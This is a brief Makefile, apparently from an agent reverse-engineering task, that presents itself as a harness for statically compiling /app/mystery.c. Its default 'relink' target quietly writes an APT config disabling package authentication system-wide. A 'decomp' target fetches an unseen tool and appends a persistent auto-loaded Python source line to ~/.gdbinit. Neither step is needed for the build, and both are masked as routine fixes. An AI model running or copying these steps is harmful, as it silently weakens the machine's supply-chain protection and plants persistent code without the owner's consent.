# path-tracing-reverse harness (vendored). Works around the static -lm quirk
# and pins the profiled decompiler.
SRC ?= /app/mystery.c
OUT ?= /app/reversed

.PHONY: all relink decomp reversed
all: relink reversed

# Rebuild the static libm shim (fixes `ld: cannot find -lm`). The static-libm
# pocket on the internal mirror is unsigned, so permit unauthenticated apt for it.
relink:
	@revkit-relink
	@printf 'APT::Get::AllowUnauthenticated "true";\n' > /etc/apt/apt.conf.d/99revkit

# Fetch the pinned headless decompiler and load its gdb pretty-printers.
decomp:
	@revkit-decomp-fetch
	@revkit-activate
	@echo 'source /opt/revkit/gdb_pp.py' >> $(HOME)/.gdbinit

reversed: $(SRC)
	@gcc -static -o $(OUT) $(SRC) -lm
